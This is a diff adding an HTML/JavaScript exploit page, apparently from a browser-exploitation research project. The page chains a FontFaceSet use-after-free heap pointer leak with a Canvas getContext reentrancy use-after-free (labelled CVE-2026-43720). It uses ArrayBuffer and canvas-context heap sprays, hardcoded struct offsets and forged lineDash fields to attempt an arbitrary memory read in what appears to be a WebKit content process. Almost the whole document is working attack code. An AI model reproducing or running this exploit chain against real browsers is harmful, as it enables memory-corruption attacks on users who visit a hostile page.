@@ -1,0 +1,609 @@
+<!--
+  p570: Forged stateStack lineDash read via Canvas UAF + FontFaceSet heap leak.
+
+  This is the "forged state inside a live context" experiment from issue #169.
+  Two phases, one page, same WebProcess:
+
+    Phase 1 — FontFaceSet::load() UAF heap pointer leak (p563 trigger).
+      Free a CSSFontFace via the sync then-getter, reclaim with 192-byte
+      ArrayBuffer spray, read the two engine-written heap pointers at +0x58
+      and +0x68 (WeakHashSet impl + WeakPtr impl).
+
+    Phase 2 — Canvas getContext reentrancy UAF (CVE-2026-43720).
+      Trigger the context-replacement UAF via alpha getter + getContext('2d').
+      Spray same-type Canvas2D contexts so one occupies the freed slot.
+      The stale inner wrapper now aliases a live sprayed context (BIDIR=1).
+      Make the live context realize its stateStack (8x save() + lineWidth
+      setter), allocating a 7424-byte out-of-line buffer.  Then forge
+      lineDash{ptr,cap,size} at State offsets +184/+192/+196 using the leaked
+      heap pointer, and read through getLineDash() on the stale wrapper.
+
+      getLineDash() is a raw 16-byte memcpy: ptr → output array, no table
+      walk, no double-hop dereference.  The semantic-depth fault that killed
+      textAlign/lineWidth reads (which go state() → m_stateStack.last() →
+      *m_buffer — two pointer hops) should not apply here.
+
+  Offsets from clang -fdump-record-layouts against WK-1400 NDEBUG:
+    CanvasRenderingContext2D:
+      m_stateStack.m_buffer +112, .m_capacity +120, .m_size +124
+      inline State starts at +128, sizeof(State) = 464
+    State:
+      lineWidth         +64   (= context +192)
+      lineDash.ptr      +184  (= context +312)
+      lineDash.capacity +192  (= context +320)
+      lineDash.size     +196  (= context +324)
+      textAlign         +216  (= context +344)
+
+  Serve via tools/browser_runner/serve.py.  Needs a fresh console window
+  (cold boot or guide restart) for best hit rate on phase 1.
+
+  CRASH_CLASS: MODERATE (phase 1 may kill on miss; phase 2 getLineDash may
+  fault if the forged pointer is bad — but the context is live, so single-hop
+  reads should survive even on failure).
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p570 forged-state linedash</title>
+<script>
+/* ---- beacon: synchronous XHR so the log survives a crash ---- */
+function b(m) {
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', '/beacon/' + encodeURIComponent(m) + '?t=' + Date.now(), false);
+    x.send(null);
+  } catch (e) {}
+}
+
+function hex8(arr, off) {
+  var s = '';
+  for (var i = 0; i < 8; i++) {
+    var v = arr[off + i];
+    s += (v < 16 ? '0' : '') + v.toString(16);
+  }
+  return s;
+}
+
+function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
+
+/* ================================================================
+   PHASE 1: FontFaceSet::load() UAF — leak heap pointers
+   ================================================================ */
+
+var leaked58 = null, leaked68 = null;
+var phase1Done = false;
+
+function phase1() {
+  b('P570-PH1-START');
+
+  var styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+
+  var A = new FontFace('f0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__fontAlive = [A];
+
+  var firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function () {
+      if (firedHere) return undefined;
+      firedHere = true;
+
+      /* free the CSSFontFace: full release triplet */
+      styleEl.remove();
+      styleEl.textContent = '';
+      styleEl = null;
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight; /* force layout flush */
+
+      /* reclaim: 13 size classes x 8 = 104 ArrayBuffers */
+      var SIZES = [64, 96, 128, 160, 192, 224, 256, 320, 384, 512, 768, 1024, 2048];
+      window.__abmap = [];
+      for (var si = 0; si < SIZES.length; si++) {
+        for (var k = 0; k < 8; k++) {
+          var ab = new ArrayBuffer(SIZES[si]);
+          window.__abmap.push({ size: SIZES[si], view: new Uint8Array(ab) });
+        }
+      }
+      try { document.fonts.check('1em s0'); } catch (e) {}
+      return undefined;
+    },
+    set: function () {}
+  });
+
+  b('P570-PH1-LOAD');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function () { b('P570-PH1-RESOLVED'); },
+    function () { b('P570-PH1-REJECTED'); }
+  );
+
+  /* scan at 60ms and 400ms for the engine-written pointers */
+  setTimeout(scanPhase1, 60);
+  setTimeout(scanPhase1, 400);
+  setTimeout(function () {
+    if (!phase1Done) b('P570-PH1-TIMEOUT');
+  }, 2000);
+}
+
+function scanPhase1() {
+  if (phase1Done) return;
+  var m = window.__abmap;
+  if (!m || !m.length) return;
+
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, nz = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) nz++;
+    if (nz > 0 && m[i].size === 192) {
+      /* found the 192-byte hit — extract +0x58 and +0x68 */
+      leaked58 = [];
+      leaked68 = [];
+      for (var q = 0; q < 8; q++) {
+        leaked58.push(v[0x58 + q]);
+        leaked68.push(v[0x68 + q]);
+      }
+      phase1Done = true;
+      b('P570-PH1-HIT-b' + i + '-nz' + nz +
+        '-p58=' + hex8(v, 0x58) + '-p68=' + hex8(v, 0x68));
+
+      /* proceed to phase 2 after a short delay */
+      setTimeout(phase2, 100);
+      return;
+    }
+  }
+
+  /* check any non-192 hit */
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i].view, nz = 0;
+    for (var j = 0; j < v.length; j++) if (v[j] !== 0) nz++;
+    if (nz > 0) {
+      phase1Done = true;
+      b('P570-PH1-WRONGSIZE-b' + i + '-s' + m[i].size + '-nz' + nz);
+      return;
+    }
+  }
+}
+
+/* ================================================================
+   PHASE 2: Canvas UAF + forged stateStack lineDash read
+   ================================================================ */
+
+function phase2() {
+  if (!leaked58) {
+    b('P570-PH2-NOLEAK');
+    return;
+  }
+
+  b('P570-PH2-START-p58=' + hex8(new Uint8Array(leaked58), 0) +
+    '-p68=' + hex8(new Uint8Array(leaked68), 0));
+
+  /* ---- Step 2a: Trigger canvas UAF via alpha getter ---- */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1;
+  canvas.height = 1;
+  document.body.appendChild(canvas);
+
+  var inner = null;
+  var getterFired = 0;
+  var opts = {};
+
+  Object.defineProperty(opts, 'alpha', {
+    get: function () {
+      getterFired++;
+      if (getterFired === 1) {
+        inner = canvas.getContext('2d');
+      }
+      return true;
+    },
+    enumerable: true
+  });
+
+  var outer = null;
+  try {
+    outer = canvas.getContext('2d', opts);
+  } catch (e) {
+    b('P570-PH2-CTX-ERR-' + e.message);
+    return;
+  }
+
+  if (outer === inner || !inner) {
+    b('P570-PH2-PATCHED-getter=' + getterFired +
+      '-same=' + (outer === inner) + '-inner=' + !!inner);
+    return;
+  }
+
+  b('P570-PH2-UAF-getter=' + getterFired +
+    '-same=' + (outer === inner) + '-inner=' + !!inner);
+
+  window.__retained = [canvas, inner, outer];
+
+  /* ---- Step 2b: Same-type spray to reclaim the freed slot ---- */
+  var SPRAY = 80;
+  var SENTINEL_TA = 'center';
+  var sprayCtx = [];
+
+  for (var i = 0; i < SPRAY; i++) {
+    var c = document.createElement('canvas');
+    c.width = 1;
+    c.height = 1;
+    document.body.appendChild(c);
+    var ctx = c.getContext('2d');
+    if (ctx) {
+      ctx.textAlign = SENTINEL_TA;
+      sprayCtx.push(ctx);
+      window.__retained.push(c, ctx);
+    }
+  }
+
+  b('P570-PH2-SPRAYED-n=' + sprayCtx.length);
+
+  /* ---- Step 2c: Verify channel — read textAlign through stale ---- */
+  var ta;
+  try { ta = inner.textAlign; } catch (e) {
+    b('P570-PH2-TA-ERR-' + e.message);
+    ta = 'ERR';
+  }
+
+  if (ta !== SENTINEL_TA) {
+    b('P570-PH2-NORECLAIM-ta=' + ta);
+    return;
+  }
+
+  b('P570-PH2-RECLAIM-OK-ta=' + ta);
+
+  /* ---- Step 2d: Find which spray context is aliased (via setLineDash) ---- */
+  try { inner.setLineDash([7.25, 3.5]); } catch (e) {
+    b('P570-PH2-SETDASH-ERR-' + e.message);
+    return;
+  }
+
+  var aliasIdx = -1;
+  for (var j = 0; j < sprayCtx.length; j++) {
+    try {
+      var ld = sprayCtx[j].getLineDash();
+      if (ld && ld.length === 2 && Math.abs(ld[0] - 7.25) < 0.01 && Math.abs(ld[1] - 3.5) < 0.01) {
+        aliasIdx = j;
+        break;
+      }
+    } catch (e) {}
+  }
+
+  if (aliasIdx < 0) {
+    b('P570-PH2-NOALIAS');
+    return;
+  }
+
+  b('P570-PH2-BIDIR-1-idx=' + aliasIdx);
+
+  /* clear the test dash */
+  try { inner.setLineDash([]); } catch (e) {}
+
+  var alias = sprayCtx[aliasIdx];
+
+  /* ---- Step 2e: Realize the stateStack on the LIVE (alias) context ----
+     8 x save() + lineWidth setter forces an out-of-line buffer allocation.
+     sizeof(State) = 464, 16 states = 7424 bytes.
+     save() alone keeps states inline; a non-default lineWidth forces realize. */
+
+  b('P570-PH2-REALIZE');
+  try {
+    for (var s = 0; s < 8; s++) {
+      alias.save();
+    }
+    alias.lineWidth = 2.0; /* non-default — forces the stack out of line */
+  } catch (e) {
+    b('P570-PH2-REALIZE-ERR-' + e.message);
+    return;
+  }
+
+  /* verify stateStack is alive through stale */
+  var lwCheck;
+  try { lwCheck = inner.lineWidth; } catch (e) { lwCheck = 'ERR:' + e; }
+  b('P570-PH2-LW-CHECK=' + lwCheck);
+
+  /* ---- Step 2f: lineDash forging strategy ----
+
+     The JS canvas API (setLineDash) writes into the Vector<double>'s DATA
+     buffer, not the Vector CONTROL BLOCK (ptr/cap/size at State+184/192/196).
+     To forge lineDash.ptr to point at the leaked address, we need raw byte
+     access to the State struct itself.
+
+     Approach: free the 7424-byte stateStack buffer and reclaim it with an
+     ArrayBuffer of the same size.  The context's m_stateStack.m_buffer still
+     points to the (now-reclaimed) address, so reads through the stale wrapper
+     (getLineDash, lineWidth) will read from our controlled bytes.
+
+     State[8] (current, after 8 saves) is at buffer+3712.
+     Within State[8]: lineWidth +64, lineDash.ptr +184, .cap +192, .size +196.
+     We write a lineWidth sentinel (12345.0) to detect successful reclaim,
+     and the leaked pointer as lineDash.ptr with cap=size=2 (read 2 doubles
+     = 16 bytes from the target address).
+
+     To free the buffer: drop all JS references to the alias context, remove
+     its canvas from DOM, GC pressure.  The stale wrapper holds a raw C++
+     pointer (not preventing collection).  If the context is collected, its
+     stateStack buffer goes to fastmalloc's free list.
+
+     This is the FIRST MEASUREMENT of the stateStack reclaim path.  If it
+     doesn't hit (GC doesn't collect, or wrong size class), we report that
+     and the team designs the next approach from the data. */
+
+  /* ---- Step 2f: Diagnostic measurements ---- */
+
+  /* Read current lineDash state through both wrappers */
+  var ldStale, ldAlias;
+  try { ldStale = inner.getLineDash(); } catch (e) { ldStale = 'ERR:' + e; }
+  try { ldAlias = alias.getLineDash(); } catch (e) { ldAlias = 'ERR:' + e; }
+  b('P570-PH2-LD-STALE=' + (Array.isArray(ldStale) ? ldStale.join(',') : ldStale));
+  b('P570-PH2-LD-ALIAS=' + (Array.isArray(ldAlias) ? ldAlias.join(',') : ldAlias));
+
+  /* Write a known dash pattern through alias, verify through stale */
+  try { alias.setLineDash([11.5, 22.5, 33.5]); } catch (e) {
+    b('P570-PH2-SETDASH2-ERR-' + e.message);
+  }
+  try { ldStale = inner.getLineDash(); } catch (e) { ldStale = 'ERR:' + e; }
+  b('P570-PH2-DASH-BIDIR=' + (Array.isArray(ldStale) ? ldStale.join(',') : ldStale));
+
+  /* ---- Step 2g: Encode the leaked pointer as a Float64 ---- */
+  var ptrBuf = new ArrayBuffer(8);
+  var ptrU8 = new Uint8Array(ptrBuf);
+  var ptrF64 = new Float64Array(ptrBuf);
+  for (var i = 0; i < 8; i++) ptrU8[i] = leaked58[i];
+  var leakedAsFloat = ptrF64[0];
+
+  b('P570-PH2-LEAKED-FLOAT=' + leakedAsFloat);
+
+  /* Also encode size=2 (16 bytes to read = 2 doubles) as uint32 LE */
+  var sizeBuf = new ArrayBuffer(8);
+  var sizeU8 = new Uint8Array(sizeBuf);
+  var sizeF64 = new Float64Array(sizeBuf);
+  /* capacity=2 at bytes 0-3, size=2 at bytes 4-7 (both uint32 LE) */
+  sizeU8[0] = 2; sizeU8[1] = 0; sizeU8[2] = 0; sizeU8[3] = 0;
+  sizeU8[4] = 2; sizeU8[5] = 0; sizeU8[6] = 0; sizeU8[7] = 0;
+  var sizeAsFloat = sizeF64[0];
+
+  b('P570-PH2-SIZE-FLOAT=' + sizeAsFloat);
+
+  /* ---- Step 2h: Pre-reclaim measurement ---- */
+  var preLW;
+  try { preLW = inner.lineWidth; } catch (e) { preLW = 'ERR:' + e; }
+  b('P570-PH2-PRE-LW=' + preLW);
+
+  /* ---- Step 2i: Read ALL accessible properties through stale ---- */
+  var props = {};
+  try { props.lineWidth = inner.lineWidth; } catch(e) { props.lineWidth = 'E'; }
+  try { props.lineCap = inner.lineCap; } catch(e) { props.lineCap = 'E'; }
+  try { props.lineJoin = inner.lineJoin; } catch(e) { props.lineJoin = 'E'; }
+  try { props.miterLimit = inner.miterLimit; } catch(e) { props.miterLimit = 'E'; }
+  try { props.lineDashOffset = inner.lineDashOffset; } catch(e) { props.lineDashOffset = 'E'; }
+  try { props.globalAlpha = inner.globalAlpha; } catch(e) { props.globalAlpha = 'E'; }
+  try { props.globalCompositeOp = inner.globalCompositeOperation; } catch(e) { props.globalCompositeOp = 'E'; }
+  try { props.shadowBlur = inner.shadowBlur; } catch(e) { props.shadowBlur = 'E'; }
+  try { props.shadowColor = inner.shadowColor; } catch(e) { props.shadowColor = 'E'; }
+  try { props.shadowOffsetX = inner.shadowOffsetX; } catch(e) { props.shadowOffsetX = 'E'; }
+  try { props.shadowOffsetY = inner.shadowOffsetY; } catch(e) { props.shadowOffsetY = 'E'; }
+  try { props.fillStyle = inner.fillStyle; } catch(e) { props.fillStyle = 'E'; }
+  try { props.strokeStyle = inner.strokeStyle; } catch(e) { props.strokeStyle = 'E'; }
+  try { props.textAlign = inner.textAlign; } catch(e) { props.textAlign = 'E'; }
+  try { props.textBaseline = inner.textBaseline; } catch(e) { props.textBaseline = 'E'; }
+  try { props.font = inner.font; } catch(e) { props.font = 'E'; }
+  try { props.direction = inner.direction; } catch(e) { props.direction = 'E'; }
+
+  var propStr = '';
+  for (var k in props) { propStr += k + '=' + props[k] + '|'; }
+  b('P570-PH2-STALE-PROPS=' + propStr.slice(0, 500));
+
+  /* ---- Step 2j: Save/restore round-trip + large dash BIDIR test ---- */
+  b('P570-PH2-RESTORE-8');
+  for (var r = 0; r < 8; r++) {
+    try {
+      alias.restore();
+    } catch (e) {
+      b('P570-PH2-RESTORE-ERR-r=' + r + '-' + e.message);
+      break;
+    }
+  }
+
+  /* Verify stale still works */
+  var postRestoreLW;
+  try { postRestoreLW = inner.lineWidth; } catch (e) { postRestoreLW = 'ERR:' + e; }
+  b('P570-PH2-POST-RESTORE-LW=' + postRestoreLW);
+
+  /* Large dash BIDIR: 64-element setLineDash through stale, read via alias */
+  var bigDash = [];
+  for (var d = 0; d < 64; d++) bigDash.push(d + 0.125);
+  try { inner.setLineDash(bigDash); } catch (e) {
+    b('P570-PH2-BIGDASH-ERR-' + e.message);
+  }
+  var bigRead;
+  try { bigRead = alias.getLineDash(); } catch (e) { bigRead = 'ERR:' + e; }
+  if (Array.isArray(bigRead)) {
+    b('P570-PH2-BIGDASH-LEN=' + bigRead.length +
+      '-first=' + bigRead[0] + '-last=' + bigRead[bigRead.length - 1]);
+  } else {
+    b('P570-PH2-BIGDASH-READ=' + bigRead);
+  }
+
+  /* ---- Step 2k: stateStack buffer reclaim experiment ----
+     Re-realize stateStack → drop alias refs → GC pressure → AB(7424) spray
+     → write forged State[8] bytes → read lineWidth sentinel through stale.
+     If sentinel hits, try getLineDash() for the arbitrary read. */
+
+  b('P570-PH2-RECLAIM-ATTEMPT');
+
+  /* Re-realize the stateStack */
+  for (var s = 0; s < 8; s++) {
+    try { alias.save(); } catch (e) {
+      b('P570-PH2-SAVE2-ERR-s=' + s);
+      break;
+    }
+  }
+  try { alias.lineWidth = 3.0; } catch (e) {}
+
+  /* Grab the alias canvas DOM node */
+  var aliasCanvas = alias.canvas;
+
+  /* Drop all JS references to the alias context and its canvas */
+  sprayCtx[aliasIdx] = null;
+  alias = null;
+
+  /* Remove the canvas from DOM */
+  try {
+    if (aliasCanvas && aliasCanvas.parentNode) {
+      aliasCanvas.parentNode.removeChild(aliasCanvas);
+    }
+  } catch (e) {}
+  aliasCanvas = null;
+
+  b('P570-PH2-REFS-DROPPED');
+
+  /* GC pressure: allocate and discard objects */
+  for (var g = 0; g < 5000; g++) {
+    var _tmp = { a: new ArrayBuffer(256), b: [g, g+1, g+2] };
+  }
+
+  b('P570-PH2-GC-PRESSURE-DONE');
+
+  /* Spray ArrayBuffer(7424) to reclaim the stateStack buffer */
+  var AB_SIZE = 7424;
+  var AB_COUNT = 64;
+  var abSpray = [];
+  for (var a = 0; a < AB_COUNT; a++) {
+    var ab = new ArrayBuffer(AB_SIZE);
+    abSpray.push({ buf: ab, u8: new Uint8Array(ab), f64: new Float64Array(ab) });
+  }
+
+  b('P570-PH2-AB-SPRAYED-n=' + abSpray.length);
+
+  /* Write forged State[8] (the top state) into each AB.
+     State[8] starts at offset 8*464 = 3712 in the 7424-byte buffer.
+     Within State[8]:
+       lineDash.ptr    = +184 → buffer offset 3712+184 = 3896
+       lineDash.cap    = +192 → buffer offset 3712+192 = 3904
+       lineDash.size   = +196 → buffer offset 3712+196 = 3908
+
+     We write:
+       3896..3903: leaked pointer (8 bytes LE) as lineDash.ptr
+       3904..3907: uint32 LE capacity = 2 (read 2 doubles = 16 bytes)
+       3908..3911: uint32 LE size = 2
+
+     Also set lineWidth at State[8]+64 = buffer+3776 to a sentinel
+     so we can detect if the reclaim worked. */
+
+  var STATE8_OFF = 3712;
+  var LW_OFF = STATE8_OFF + 64;   /* lineWidth as float */
+  var LD_PTR_OFF = STATE8_OFF + 184;
+  var LD_CAP_OFF = STATE8_OFF + 192;
+  var LD_SIZE_OFF = STATE8_OFF + 196;
+
+  for (var a = 0; a < abSpray.length; a++) {
+    var u8 = abSpray[a].u8;
+
+    /* Write lineWidth sentinel as float32: 12345.0 */
+    var lwBuf = new ArrayBuffer(4);
+    new Float32Array(lwBuf)[0] = 12345.0;
+    var lwBytes = new Uint8Array(lwBuf);
+    u8[LW_OFF] = lwBytes[0];
+    u8[LW_OFF+1] = lwBytes[1];
+    u8[LW_OFF+2] = lwBytes[2];
+    u8[LW_OFF+3] = lwBytes[3];
+
+    /* Write lineDash.ptr = leaked58 (8 bytes LE) */
+    for (var i = 0; i < 8; i++) {
+      u8[LD_PTR_OFF + i] = leaked58[i];
+    }
+
+    /* Write lineDash.capacity = 2 (uint32 LE) */
+    u8[LD_CAP_OFF] = 2;
+    u8[LD_CAP_OFF+1] = 0;
+    u8[LD_CAP_OFF+2] = 0;
+    u8[LD_CAP_OFF+3] = 0;
+
+    /* Write lineDash.size = 2 (uint32 LE) */
+    u8[LD_SIZE_OFF] = 2;
+    u8[LD_SIZE_OFF+1] = 0;
+    u8[LD_SIZE_OFF+2] = 0;
+    u8[LD_SIZE_OFF+3] = 0;
+  }
+
+  b('P570-PH2-AB-FORGED');
+
+  /* Now try to read lineWidth through the stale wrapper.
+     If the stateStack buffer was reclaimed by one of our ABs,
+     lineWidth should read ~12345.0 instead of the previous value. */
+
+  b('P570-PH2-STALE-READ-ATTEMPT');
+  var forgedLW;
+  try {
+    forgedLW = inner.lineWidth;
+  } catch (e) {
+    forgedLW = 'ERR:' + e;
+    b('P570-PH2-STALE-READ-FAULT=' + e.message);
+  }
+
+  b('P570-PH2-FORGED-LW=' + forgedLW);
+
+  if (typeof forgedLW === 'number' && Math.abs(forgedLW - 12345.0) < 1.0) {
+    b('P570-PH2-RECLAIM-HIT-LW=12345');
+
+    /* The stateStack buffer was reclaimed!  Now try getLineDash().
+       If our forged ptr/cap/size took effect, getLineDash() should
+       read 2 doubles (16 bytes) from the leaked address. */
+
+    b('P570-PH2-GETLINEDASH-ATTEMPT');
+    var forgedDash;
+    try {
+      forgedDash = inner.getLineDash();
+    } catch (e) {
+      forgedDash = 'ERR:' + e;
+      b('P570-PH2-GETLINEDASH-FAULT=' + e.message);
+    }
+
+    if (Array.isArray(forgedDash)) {
+      b('P570-PH2-GETLINEDASH-LEN=' + forgedDash.length);
+      /* Encode the doubles as hex for analysis */
+      for (var di = 0; di < forgedDash.length; di++) {
+        var dBuf = new ArrayBuffer(8);
+        new Float64Array(dBuf)[0] = forgedDash[di];
+        var dU8 = new Uint8Array(dBuf);
+        b('P570-PH2-DASH-' + di + '=' + hex8(dU8, 0) + '-f=' + forgedDash[di]);
+      }
+      b('P570-PH2-ARB-READ-SUCCESS');
+    } else {
+      b('P570-PH2-GETLINEDASH-RESULT=' + forgedDash);
+    }
+  } else {
+    b('P570-PH2-RECLAIM-MISS-LW=' + forgedLW);
+
+    /* The reclaim didn't land.  Try reading getLineDash anyway to see
+       what state the context is in */
+    var fallbackDash;
+    try {
+      fallbackDash = inner.getLineDash();
+    } catch (e) {
+      fallbackDash = 'ERR:' + e;
+    }
+    if (Array.isArray(fallbackDash)) {
+      b('P570-PH2-FALLBACK-DASH-LEN=' + fallbackDash.length +
+        '-vals=' + fallbackDash.slice(0, 5).join(','));
+    } else {
+      b('P570-PH2-FALLBACK-DASH=' + fallbackDash);
+    }
+  }
+
+  b('P570-ALIVE');
+}
+
+/* ================================================================
+   MAIN
+   ================================================================ */
+
+function run() {
+  b('P570-BOOT');
+  phase1();
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive')
+  setTimeout(run, 0);
+else
+  document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p570 forged-state linedash</p></body></html>
